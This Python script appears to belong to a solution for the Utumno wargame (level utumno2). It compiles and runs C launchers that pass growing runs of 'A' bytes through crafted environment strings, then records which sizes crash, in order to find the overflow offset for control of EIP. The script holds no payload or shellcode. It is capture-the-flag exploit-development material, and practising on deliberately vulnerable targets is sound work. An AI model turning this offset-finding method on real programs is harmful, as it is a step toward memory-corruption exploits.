#!/usr/bin/env python3
"""Find EIP offset for utumno2 by testing increasing overflow sizes."""
import subprocess, os

OUTDIR = "/tmp/utumno2"
os.makedirs(OUTDIR, exist_ok=True)

for sz in [10, 20, 30, 40, 50, 60, 70, 80, 90, 100, 110, 120, 130, 140, 150]:
    c = f'''
#include <unistd.h>
#include <string.h>
int main() {{
    char *argv[] = {{NULL}};
    char buf[{sz+1}];
    memset(buf, 0x41, {sz});
    buf[{sz}] = 0;
    char *envp[] = {{"","","","","","","", buf, "sc", NULL}};
    execve("/utumno/utumno2", argv, envp);
}}
'''
    with open(f"{OUTDIR}/t.c", "w") as f:
        f.write(c)
    ret = subprocess.run(["gcc", "-m32", "-static", f"{OUTDIR}/t.c", "-o", f"{OUTDIR}/t"],
        capture_output=True, cwd=OUTDIR)
    if ret.returncode != 0:
        print(f"sz={sz}: COMPILE FAIL")
        continue
    p = subprocess.run([f"{OUTDIR}/t"], capture_output=True, timeout=5, cwd=OUTDIR)
    sig = p.returncode & 0x7f
    core = bool(p.returncode & 0x80)
    msg = f"sz={sz}: ret={p.returncode}"
    if sig:
        msg += f" SIG{['','HUP','INT','QUIT','ILL','TRAP','ABRT','BUS','FPE','KILL','USR1','SEGV','USR2','PIPE','ALRM','TERM','STKFLT','CHLD','CONT','STOP','TSTP','TTIN','TTOU','URG','XCPU','XFSZ','VTALRM','PROF','WINCH','IO','PWR','SYS'][sig]}"
    if core:
        msg += " (core)"
    print(msg)
